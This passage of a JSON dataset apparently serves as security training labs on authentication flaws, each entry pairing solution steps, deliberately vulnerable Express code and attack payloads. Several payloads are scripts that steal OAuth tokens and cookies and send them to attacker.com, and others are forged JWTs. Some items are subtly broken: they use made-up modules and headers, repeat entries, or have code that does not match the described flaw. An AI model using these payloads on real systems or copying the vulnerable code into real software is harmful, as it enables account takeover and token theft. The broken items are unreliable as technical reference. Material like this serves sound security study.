      "Intercept MFA verification request with Burp Suite",
      "Submit invalid verification code",
      "Modify response status code from 403 to 200",
      "Forward modified response to client",
      "Observe successful authentication bypass"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();app.post('/mfa/verify', (req, res) => {if(req.body.code === '123456') res.status(200).send('Verified');else res.status(403).send('Invalid code');});app.get('/dashboard', (req, res) => {if(req.session.verified) res.send('Admin dashboard');});const PORT = 3000;app.listen(PORT);",
    "payloads": [
      "POST /mfa/verify HTTP/1.1\r\nHost: victim.com\r\nContent-Length: 15\r\n\r\n{\"code\":\"111111\"}",
      "HTTP/1.1 200 OK\r\nContent-Length: 8\r\n\r\nVerified"
    ]
  },
  {
    "Lab scenario": "Credential stuffing via password reset timing attack",
    "Lab Description": "The password reset endpoint leaks account existence through response timing. The application [takes longer to respond for valid accounts]. To solve: Perform timing attack to enumerate valid accounts then credential stuff with known passwords.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Identify password reset endpoint using OWASP ZAP",
      "Measure response times for known valid/invalid accounts",
      "Automate timing attack with Burp Intruder",
      "Identify accounts with statistically significant longer responses",
      "Perform credential stuffing against enumerated accounts"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();const users = [{email:'admin@victim.com'}];app.post('/reset-password', (req, res) => {const user = users.find(u => u.email === req.body.email);if(user) {expensiveHash(req.body.email);res.send('If account exists, email sent');} else {res.send('If account exists, email sent');}});const PORT = 3000;app.listen(PORT);",
    "payloads": [
      "{\"email\":\"admin@victim.com\"}",
      "{\"email\":\"unknown@test.com\"}"
    ]
  },
  {
    "Lab scenario": "Session hijacking via JWT cross-service replay",
    "Lab Description": "The same JWT secret is used across multiple microservices. The application [shares verification keys between services]. To solve: Capture low-privilege token from one service and replay it to privileged endpoints in another service.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Obtain valid JWT from user-facing service using Burp Suite",
      "Identify administrative API endpoints through documentation",
      "Replay captured token to administrative endpoints",
      "Escalate privileges by modifying token claims",
      "Access restricted functionality across services"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const jwt = require('jsonwebtoken');const app = express();const secret = 'shared-secret-123';app.post('/admin/api', (req, res) => {try {const decoded = jwt.verify(req.headers.authorization, secret);res.send('Admin access');} catch(e) {res.status(403).send('Forbidden');}});const PORT = 3000;app.listen(PORT);",
    "payloads": [
      "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c",
      "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiYWRtaW4ifQ.7Z6Jz5Q4hX9y8Uv2w3T1x0R7v6N9m8B7v6N9m8B7v6N9m8B"
    ]
  },
  {
    "Lab scenario": "JWT authentication bypass via empty signature",
    "Lab Description": "The JWT validation fails when encountering tokens with empty signatures. The application [incorrectly processes unsigned tokens as valid]. To solve: Remove the signature portion from a valid JWT while keeping the header and payload intact to bypass authentication.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Capture a valid JWT token using Burp Suite",
      "Decode the token structure using jwt.io",
      "Remove the signature portion completely",
      "Submit the modified token ending with a dot",
      "Access privileged endpoints with the unsigned token"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const jwt = require('jsonwebtoken');const app = express();app.get('/admin', (req, res) => {const token = req.headers.authorization;try {const decoded = jwt.verify(token, 'secret', {algorithms:['HS256']});res.send('Admin access');} catch(e) {res.status(403).send('Forbidden');}});const PORT = 3000;app.listen(PORT);",
    "payloads": [
      "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.",
      "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiYWRtaW4ifQ."
    ]
  },
  {
    "Lab scenario": "OAuth token leakage via misconfigured CORS",
    "Lab Description": "The OAuth token endpoint has overly permissive CORS headers. The application [exposes tokens to arbitrary origins]. To solve: Craft malicious JavaScript to retrieve tokens cross-origin and exfiltrate them to an attacker-controlled server.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify OAuth token endpoint using OWASP ZAP",
      "Analyze CORS headers for Access-Control-Allow-Origin values",
      "Create malicious page with XMLHttpRequest to token endpoint",
      "Configure server to receive exfiltrated tokens",
      "Trigger victim to visit malicious page"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();app.use((req, res, next) => {res.set('Access-Control-Allow-Origin', '*');next();});app.post('/oauth/token', (req, res) => {res.json({access_token: 'secret123'});});const PORT = 3000;app.listen(PORT);",
    "payloads": [
      "<script>fetch('https://victim.com/oauth/token').then(r=>r.json()).then(d=>fetch('https://attacker.com/?token='+d.access_token))</script>",
      "var xhr=new XMLHttpRequest();xhr.open('POST','https://victim.com/oauth/token');xhr.onload=function(){document.location='https://attacker.com/?token='+JSON.parse(this.responseText).access_token};xhr.send();"
    ]
  },
  {
    "Lab scenario": "Session fixation via JSON Web Encryption",
    "Lab Description": "The application uses JWE tokens for session management but fails to validate key ownership. The application [accepts encrypted tokens with attacker-controlled keys]. To solve: Generate new encryption key pair, create JWE token with victim's session data, and fixate session.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Analyze JWE token structure using Burp Suite",
      "Generate new RSA key pair using OpenSSL",
      "Encrypt valid session payload with attacker's public key",
      "Inject crafted JWE token via cookie manipulation",
      "Force victim to use the fixated session"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const jose = require('node-jose');const app = express();app.get('/profile', async (req, res) => {try {const keystore = jose.JWK.createKeyStore();await keystore.add(req.cookies.key,'pem');const decrypted = await jose.JWE.createDecrypt(keystore).decrypt(req.cookies.session);res.send('User profile');} catch(e) {res.status(403).send('Forbidden');}});const PORT = 3000;app.listen(PORT);",
    "payloads": [
      "eyJhbGciOiJSU0EtT0FFUCIsImVuYyI6IkEyNTZHQ00ifQ.eyJzZXNzaW9uIjoiMTIzIn0.KAQ...",
      "eyJhbGciOiJSU0EtT0FFUCIsImVuYyI6IkEyNTZHQ00ifQ.eyJ1c2VyIjoiYWRtaW4ifQ.LSI..."
    ]
  },
  {
    "Lab scenario": "MFA bypass via parallel session exploitation",
    "Lab Description": "The MFA verification doesn't invalidate existing sessions after completion. The application [allows multiple concurrent sessions]. To solve: Maintain authenticated session while completing MFA in different browser to bypass verification requirement.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Log in and obtain pre-MFA session cookie using Burp Suite",
      "Preserve this session in one browser instance",
      "Complete MFA verification in separate browser instance",
      "Reuse original session cookie to access protected resources",
      "Access privileged endpoints without completing MFA"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();const sessions = {};app.post('/login', (req, res) => {const session = uuidv4();sessions[session] = {user: req.body.user, mfaVerified: false};res.cookie('session', session);res.send('Complete MFA');});app.post('/verify-mfa', (req, res) => {sessions[req.cookies.session].mfaVerified = true;res.send('Verified');});app.get('/admin', (req, res) => {if(sessions[req.cookies.session].mfaVerified) res.send('Admin panel');else res.status(403).send('MFA required');});const PORT = 3000;app.listen(PORT);",
    "payloads": [
      "Cookie: session=pre-mfa-session",
      "Cookie: session=verified-session"
    ]
  },
  {
    "Lab scenario": "JWT authentication bypass via key confusion attack",
    "Lab Description": "The JWT implementation accepts both symmetric and asymmetric algorithms but fails to properly validate key types. The application [treats public keys as HMAC secrets]. To solve: Exploit algorithm confusion to forge valid tokens by signing with the public key as an HMAC secret.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Extract public key from application's /.well-known/jwks.json endpoint",
      "Convert public key to PEM format using OpenSSL",
      "Modify JWT header to use HS256 algorithm",
      "Sign token using public key as HMAC secret",
      "Submit forged token to privileged endpoints"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const jwt = require('jsonwebtoken');const fs = require('fs');const app = express();const publicKey = fs.readFileSync('./public.pem');app.post('/admin', (req, res) => {try {jwt.verify(req.body.token, publicKey, {algorithms: ['RS256','HS256']});res.send('Admin access');} catch(e) {res.status(403).send('Forbidden');}});const PORT = 3000;app.listen(PORT);",
    "payloads": [
      "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c",
      "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiYWRtaW4ifQ.7Z6Jz5Q4hX9y8Uv2w3T1x0R7v6N9m8B7v6N9m8B7v6N9m8B"
    ]
  },
  {
    "Lab scenario": "OAuth token hijacking via referer header leakage",
    "Lab Description": "The OAuth implementation leaks access tokens through referer headers when loading external resources. The application [includes tokens in GET parameters]. To solve: Craft malicious page that triggers resource loading to capture tokens through referer headers.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Analyze OAuth flow using OWASP ZAP",
      "Identify token leakage in referer headers",
      "Create malicious page with embedded resources",
      "Trigger victim to visit page while authenticated",
      "Capture token from server logs"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();app.get('/oauth/callback', (req, res) => {const token = req.query.access_token;res.send(`<img src=\"https://external.com/logo.png\">`);});app.get('/profile', (req, res) => {if(req.headers.authorization === `Bearer ${token}`) res.send(userData);});const PORT = 3000;app.listen(PORT);",
    "payloads": [
      "<img src=\"http://attacker.com/collect?leak=\">",
      "<link rel=\"stylesheet\" href=\"http://attacker.com/steal.css\">"
    ]
  },
  {
    "Lab scenario": "Session fixation via HTTP/2 request smuggling",
    "Lab Description": "The application's HTTP/2 implementation improperly processes session cookies across multiplexed streams. The application [assigns sessions based on first request's headers]. To solve: Craft HTTP/2 requests to fixate session cookie across multiple connections.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify HTTP/2 support using Burp Suite",
      "Construct malicious HTTP/2 requests with conflicting headers",
      "Fixate session cookie in initial stream",
      "Force victim to authenticate over same connection",
      "Hijack authenticated session"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const http2 = require('http2');const fs = require('fs');const server = http2.createSecureServer({cert:fs.readFileSync('server.crt'),key:fs.readFileSync('server.key')});server.on('stream', (stream, headers) => {if(!headers['cookie']) headers['cookie'] = `session=${uuidv4()}`;stream.respond({'content-type':'text/html'});stream.end('Response');});server.listen(3000);",
    "payloads": [
      "GET / HTTP/2\r\nHost: victim.com\r\nCookie: session=malicious123\r\n\r\n",
      "POST /login HTTP/2\r\nHost: victim.com\r\nCookie: session=malicious123\r\n\r\nusername=admin&password=admin"
    ]
  },
  {
    "Lab scenario": "MFA bypass via response manipulation",
    "Lab Description": "The MFA verification relies on client-side validation of success responses. The application [processes all 200 responses as successful]. To solve: Intercept and modify failed verification responses to appear successful.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Intercept MFA verification request with Burp Suite",
      "Submit invalid verification code",
      "Modify response body from failure to success",
      "Forward modified response to client",
      "Observe authentication bypass"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();app.post('/mfa/verify', (req, res) => {if(req.body.code === '123456') res.json({success:true});else res.json({success:false});});app.get('/dashboard', (req, res) => {if(req.session.verified) res.send('Admin dashboard');});const PORT = 3000;app.listen(PORT);",
    "payloads": [
      "{\"code\":\"111111\"}",
      "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\n\r\n{\"success\":true}"
    ]
  },
  {
    "Lab scenario": "Credential stuffing via password reset timing attack",
    "Lab Description": "The password reset endpoint leaks account existence through response timing. The application [takes longer to process valid accounts]. To solve: Perform timing attack to enumerate valid accounts then credential stuff with common passwords.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Identify password reset endpoint using OWASP ZAP",
      "Measure response times for known valid/invalid accounts",
      "Automate timing attack with Burp Intruder",
      "Identify accounts with statistically significant longer responses",
      "Perform credential stuffing against enumerated accounts"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();const users = [{email:'admin@victim.com'}];app.post('/reset-password', (req, res) => {const user = users.find(u => u.email === req.body.email);if(user) {expensiveHash(req.body.email);res.send('If account exists, email sent');} else {res.send('If account exists, email sent');}});const PORT = 3000;app.listen(PORT);",
    "payloads": [
      "{\"email\":\"admin@victim.com\"}",
      "{\"email\":\"unknown@test.com\"}"
    ]
  },
  {
    "Lab scenario": "JWT authentication bypass via null signature attack",
    "Lab Description": "The JWT validation fails to properly handle tokens with null bytes in the signature. The application [incorrectly validates truncated signatures]. To solve: Craft a token with null bytes in the signature to bypass validation while maintaining valid header and payload.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Capture a valid JWT token using Burp Suite",
      "Decode the token structure using jwt.io",
      "Modify the signature to include null bytes",
      "Submit the malformed token to authentication endpoints",
      "Observe successful authentication bypass"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const jwt = require('jsonwebtoken');const app = express();app.post('/admin', (req, res) => {try {jwt.verify(req.body.token, 'secret', {algorithms:['HS256']});res.send('Admin access');} catch(e) {res.status(403).send('Forbidden');}});const PORT = 3000;app.listen(PORT);",
    "payloads": [
      "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.00000000",
      "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiYWRtaW4ifQ.AAAAAAAA"
    ]
  },
  {
    "Lab scenario": "OAuth token leakage via WebSocket subprotocol negotiation",
    "Lab Description": "The OAuth implementation leaks tokens during WebSocket subprotocol handshake. The application [includes sensitive tokens in Sec-WebSocket-Protocol headers]. To solve: Intercept WebSocket connections and extract tokens from handshake headers.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Identify WebSocket endpoints using OWASP ZAP",
      "Analyze WebSocket handshake requests",
      "Capture tokens from Sec-WebSocket-Protocol headers",
      "Reuse tokens in REST API requests",
      "Access privileged endpoints with stolen tokens"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const WebSocket = require('ws');const app = express();const wss = new WebSocket.Server({server: app.listen(3000)});wss.on('connection', (ws, req) => {const token = req.headers['sec-websocket-protocol'];ws.send('Authenticated');});",
    "payloads": [
      "Sec-WebSocket-Protocol: bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
      "GET /chat HTTP/1.1\r\nHost: victim.com\r\nConnection: Upgrade\r\nUpgrade: websocket\r\nSec-WebSocket-Protocol: bearer malicious_token\r\n\r\n"
    ]
  },
  {
    "Lab scenario": "Session fixation via HTTP/3 connection migration",
    "Lab Description": "The HTTP/3 implementation assigns session tokens based on QUIC connection IDs. The application [reuses session state across migrated connections]. To solve: Fixate session by forcing connection migration before authentication.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify HTTP/3 support using Chrome DevTools",
      "Capture initial connection handshake",
      "Trigger connection migration by changing networks",
      "Authenticate during migrated connection",
      "Reuse session from original connection"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const http3 = require('node:http3');const app = http3.createServer((req, res) => {if(!req.session) req.session = uuidv4();res.end('Connected');});app.listen(3000);",
    "payloads": [
      "GET / HTTP/3\r\nHost: victim.com\r\nConnection-ID: fixed123\r\n\r\n",
      "POST /login HTTP/3\r\nHost: victim.com\r\nConnection-ID: fixed123\r\n\r\nusername=admin&password=admin"
    ]
  },
  {
    "Lab scenario": "MFA bypass via WebAuthn replay attack",
    "Lab Description": "The WebAuthn implementation fails to validate challenge nonces properly. The application [accepts reused authentication assertions]. To solve: Capture valid WebAuthn assertion and replay it to bypass MFA.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept WebAuthn authentication flow using Burp Suite",
      "Capture valid authentication assertion",
      "Modify assertion timestamp and counter",
      "Replay assertion to authentication endpoint",
      "Observe successful MFA bypass"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();app.post('/webauthn/verify', (req, res) => {if(validateAssertion(req.body.assertion)) res.send('Verified');else res.status(403).send('Invalid');});const PORT = 3000;app.listen(PORT);",
    "payloads": [
      "{\"assertion\":{\"authenticatorData\":\"...\",\"clientDataJSON\":\"...\",\"signature\":\"...\"}}",
      "{\"assertion\":{\"authenticatorData\":\"malicious\",\"clientDataJSON\":\"data\",\"signature\":\"fake\"}}"
    ]
  },
  {
    "Lab scenario": "Credential stuffing via case-sensitive cookie parsing",
    "Lab Description": "The authentication system processes cookies with case-sensitive inconsistencies. The application [treats 'Session' and 'session' as different cookies]. To solve: Perform credential stuffing with case-varied cookie names to bypass authentication.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Identify authentication cookie using OWASP ZAP",
      "Test cookie name case sensitivity",
      "Load credential lists into Burp Intruder",
      "Configure payload processing for case variations",
      "Identify successful authentications"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();app.get('/admin', (req, res) => {if(req.cookies.Session === 'valid') res.send('Admin panel');else res.status(403).send('Forbidden');});const PORT = 3000;app.listen(PORT);",
    "payloads": [
      "Cookie: Session=valid",
      "Cookie: session=valid"
    ]
  },
  {
    "Lab scenario": "JWT authentication bypass via key ID confusion",
    "Lab Description": "The JWT implementation incorrectly processes key IDs from untrusted sources. The application [uses kid header to select verification keys without proper validation]. To solve: Inject malicious kid header pointing to attacker-controlled key to forge valid tokens.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept valid JWT using Burp Suite",
      "Identify kid header in token structure",
      "Set up attacker-controlled JWKS endpoint",
      "Modify kid header to reference malicious key",
      "Sign token with attacker's private key and submit"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const jwt = require('jsonwebtoken');const app = express();app.get('/admin', (req, res) => {const token = req.headers.authorization;const key = getKeyFromKid(token.header.kid);jwt.verify(token, key);res.send('Admin access');});const PORT = 3000;app.listen(PORT);",
    "payloads": [
      "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6ImF0dGFja2VyLWNvbnRyb2xsZWQta2V5In0.eyJ1c2VyIjoiYWRtaW4ifQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c",
      "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Im1hbGljaW91cy1rZXkifQ.eyJyb2xlIjoiYWRtaW4ifQ.7Z6Jz5Q4hX9y8Uv2w3T1x0R7v6N9m8B7v6N9m8B7v6N9m8B"
    ]
  },
  {
    "Lab scenario": "OAuth token hijacking via iframe CSP bypass",
    "Lab Description": "The OAuth token endpoint is embedded in iframes with overly permissive CSP headers. The application [leaks tokens through postMessage events]. To solve: Craft malicious page that extracts tokens via iframe CSP bypass.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Identify OAuth iframe endpoints using OWASP ZAP",
      "Analyze CSP headers for unsafe-eval or unsafe-inline directives",
      "Create malicious page embedding target iframe",
      "Inject JavaScript to intercept postMessage events",
      "Extract OAuth tokens from message data"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();app.get('/oauth/iframe', (req, res) => {res.set('Content-Security-Policy', \"default-src 'self' 'unsafe-inline'\");res.send(`<script>parent.postMessage({token:'secret123'},'*')</script>`);});const PORT = 3000;app.listen(PORT);",
    "payloads": [
      "<iframe src=\"https://victim.com/oauth/iframe\" onload=\"window.addEventListener('message',e=>document.location='http://attacker.com/?token='+e.data.token)\"></iframe>",
      "<script>var iframe=document.createElement('iframe');iframe.src='https://victim.com/oauth/iframe';document.body.appendChild(iframe);window.addEventListener('message',e=>fetch('http://attacker.com',{method:'POST',body:e.data.token}));</script>"
    ]
  },
  {
    "Lab scenario": "Session fixation via HTTP/2 stream prioritization",
    "Lab Description": "The HTTP/2 implementation assigns sessions based on stream dependencies. The application [reuses session state across dependent streams]. To solve: Craft HTTP/2 requests with malicious stream dependencies to fixate sessions.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify HTTP/2 support using Chrome DevTools",
      "Capture initial connection handshake",
      "Construct requests with malicious stream dependencies",
      "Fixate session cookie in parent stream",
      "Force victim to authenticate in dependent stream"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const http2 = require('http2');const fs = require('fs');const server = http2.createSecureServer({cert:fs.readFileSync('server.crt'),key:fs.readFileSync('server.key')});server.on('stream', (stream, headers) => {if(headers[':path'] === '/login') stream.session = uuidv4();});server.listen(3000);",
    "payloads": [
      "GET / HTTP/2\r\nHost: victim.com\r\n\r\n",
      "POST /login HTTP/2\r\nHost: victim.com\r\nStream-Dependency: 1\r\n\r\nusername=admin&password=admin"
    ]
  },
  {
    "Lab scenario": "MFA bypass via TOTP prediction",
    "Lab Description": "The TOTP implementation uses insufficient entropy in seed generation. The application [generates predictable OTP sequences]. To solve: Capture multiple OTPs and reverse-engineer the generation algorithm to predict valid codes.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Enroll multiple test accounts and collect their TOTP seeds",
      "Analyze seed patterns using Python scripts",
      "Reverse-engineer seed generation formula",
      "Calculate victim's likely seed based on username",
      "Generate valid TOTP codes using predicted seed"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const speakeasy = require('speakeasy');const app = express();app.post('/mfa/enroll', (req, res) => {const seed = Buffer.from(req.body.username).toString('hex').slice(0,10);const otp = speakeasy.generateSecret({seed});res.json(otp);});const PORT = 3000;app.listen(PORT);",
    "payloads": [
      "{\"username\":\"carlos\",\"code\":\"123456\"}",
      "{\"username\":\"admin\",\"code\":\"654321\"}"
    ]
  },
  {
    "Lab scenario": "JWT authentication bypass via header parameter injection",
    "Lab Description": "The JWT implementation fails to properly sanitize header parameters before verification. The application [processes malicious x5u header values as valid certificate URLs]. To solve: Inject x5u header pointing to attacker-controlled certificate to bypass signature validation.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept valid JWT using Burp Suite",
      "Add x5u header with URL to malicious certificate",
      "Host crafted X.509 certificate on attacker server",
      "Sign token with certificate's private key",
      "Submit forged token to authentication endpoints"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const jwt = require('jsonwebtoken');const app = express();app.post('/verify', (req, res) => {const options = {algorithms: ['RS256'],complete: true};const decoded = jwt.verify(req.body.token, null, options);res.send('Valid');});const PORT = 3000;app.listen(PORT);",
    "payloads": [
      "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsIng1dSI6Imh0dHBzOi8vYXR0YWNrZXIuY29tL21hbGljaW91cy5jZXIifQ.eyJ1c2VyIjoiYWRtaW4ifQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c",
      "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsIng1dSI6Imh0dHBzOi8vZXZpbC5jb20vZmFrZS5jZXIifQ.eyJyb2xlIjoiYWRtaW4ifQ.7Z6Jz5Q4hX9y8Uv2w3T1x0R7v6N9m8B7v6N9m8B7v6N9m8B"
    ]
  },
  {
    "Lab scenario": "OAuth token leakage via DNS prefetch",
    "Lab Description": "The OAuth implementation includes tokens in external resource URLs that trigger DNS prefetching. The application [leaks tokens through DNS lookups]. To solve: Craft malicious page with resource links containing tokens to capture them via DNS exfiltration.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Analyze OAuth flow using OWASP ZAP",
      "Identify token leakage in resource URLs",
      "Set up DNS logging server",
      "Create page with prefetch links containing tokens",
      "Capture tokens from DNS queries"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();app.get('/oauth/callback', (req, res) => {const token = req.query.access_token;res.send(`<link rel=\"dns-prefetch\" href=\"//${token}.attacker.com\">`);});const PORT = 3000;app.listen(PORT);",
    "payloads": [
      "<link rel=\"dns-prefetch\" href=\"//eyJhbGciOi.attacker.com\">",
      "<link rel=\"preconnect\" href=\"//token-leak.attacker.com/?t=eyJhbGciOi\">"
    ]
  },
  {
    "Lab scenario": "Session fixation via WebTransport session IDs",
    "Lab Description": "The WebTransport implementation assigns session tokens before authentication. The application [uses connection IDs as session tokens]. To solve: Establish WebTransport connection, fixate session ID, and force victim to authenticate over same connection.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Establish WebTransport connection using Chrome DevTools",
      "Note session ID in initial handshake",
      "Create malicious page that forces victim authentication",
      "Monitor data streams for victim's session",
      "Hijack authenticated session"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const { WebTransport } = require('@fails-components/webtransport');const wt = new WebTransport('https://localhost:3000');wt.ready.then(() => {wt.session = uuidv4();});",
    "payloads": [
      "CONNECT / HTTP/3\r\nHost: victim.com\r\nSec-WebTransport-Protocol: session-fixation\r\n\r\n",
      "GET /auth HTTP/3\r\nHost: victim.com\r\nSession-ID: malicious123\r\n\r\n"
    ]
  },
  {
    "Lab scenario": "MFA bypass via state parameter tampering",
    "Lab Description": "The MFA verification relies on client-supplied state parameters. The application [trusts state parameters without server-side validation]. To solve: Modify state parameter to bypass verification after initial MFA challenge.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Intercept MFA initiation request with Burp Suite",
      "Capture state parameter value",
      "Submit invalid verification code",
      "Modify state parameter in final verification request",
      "Observe successful authentication bypass"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();app.post('/mfa/verify', (req, res) => {if(req.body.state === 'verified') res.send('Success');else res.status(403).send('Failed');});const PORT = 3000;app.listen(PORT);",
    "payloads": [
      "{\"code\":\"111111\",\"state\":\"pending\"}",
      "{\"code\":\"111111\",\"state\":\"verified\"}"
    ]
  },
  {
    "Lab scenario": "Credential stuffing via HTTP/3 connection reuse",
    "Lab Description": "The authentication system reuses HTTP/3 connections for multiple requests. The application [maintains session state across requests on same connection]. To solve: Perform credential stuffing by reusing established connections to bypass rate limits.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Identify HTTP/3 support using Chrome DevTools",
      "Establish persistent connection to target",
      "Load credential lists into Burp Intruder",
      "Configure Intruder to reuse HTTP/3 connection",
      "Execute high-volume credential stuffing attack"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const http3 = require('node:http3');const server = http3.createServer((req, res) => {if(!req.connection.session) req.connection.session = uuidv4();res.end('Connected');});server.listen(3000);",
    "payloads": [
      "POST /login HTTP/3\r\nHost: victim.com\r\nConnection: keep-alive\r\n\r\nusername=admin&password=admin",
      "POST /login HTTP/3\r\nHost: victim.com\r\nConnection: reuse\r\n\r\nusername=user&password=password"
    ]
  },
  {
    "Lab scenario": "JWT algorithm switching vulnerability in REST API",
    "Lab Description": "The lab's authentication system uses JWTs with flawed algorithm validation. The application accepts unsigned tokens when the algorithm is switched to 'none'. To solve: forge a valid JWT for the admin user by exploiting algorithm confusion.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept login request with Burp Suite to capture a valid JWT",
      "Decode the JWT using jwt.io to analyze structure and claims",
      "Modify the algorithm header to 'none' and remove the signature",
      "Change the 'sub' claim to 'admin' and 'role' to 'administrator'",
      "Submit the modified token in Authorization header to access admin panel"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const jwt = require('jsonwebtoken');const app = express();app.get('/admin', (req, res) => {const token = req.headers.authorization.split(' ')[1];const decoded = jwt.verify(token, null, { algorithms: ['HS256', 'none'] });if (decoded.role === 'administrator') return res.send('Admin panel');res.status(403).send('Forbidden');});const PORT = 3000;app.listen(PORT);",
    "payloads": [
      "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbmlzdHJhdG9yIn0.",
      "eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ",
      "eyJhbGciOiJOb25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwicHJpdmlsZWdlIjoiYWRtaW4ifQ"
    ]
  },
  {
    "Lab scenario": "OAuth token leakage via referer header in SPA",
    "Lab Description": "The OAuth implementation leaks authorization codes through referer headers when loading external resources. The application doesn't validate the redirect_uri properly. To solve: steal an OAuth token by intercepting the referer header and gain access to the victim's data.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use OWASP ZAP to intercept OAuth flow initiation",
      "Inject malicious JavaScript that loads an attacker-controlled image",
      "Capture the authorization code from referer header in server logs",
      "Exchange the stolen code for an access token at the token endpoint",
      "Use the token to query the userinfo endpoint for sensitive data"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();app.get('/oauth/callback', (req, res) => {const code = req.query.code;if(code) return res.send('<script>new Image().src=\"https://attacker.com/steal?ref=\"+encodeURIComponent(document.referrer)</script>');res.send('Invalid code');});app.get('/userinfo', (req, res) => {if(req.headers.authorization === 'Bearer valid-token') return res.json({email: 'admin@vuln.com'});res.status(401).send('Unauthorized');});app.listen(3000);",
    "payloads": [
      "<img src=x onerror=this.src='http://attacker.com/?leak='+encodeURIComponent(document.referrer)>",
      "<script>fetch('http://attacker.com/collect?data='+btoa(document.cookie))</script>",
      "<link rel=\"stylesheet\" href=\"http://attacker.com/?stolen=\"+document.location.href>"
    ]
  },
  {
    "Lab scenario": "GraphQL batching attack on auth mutation",
    "Lab Description": "The GraphQL endpoint processes authentication mutations in batches without rate limiting. The application fails to track login attempts across batched requests. To solve: perform a credential stuffing attack by sending 1000 password guesses in a single GraphQL batch request.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
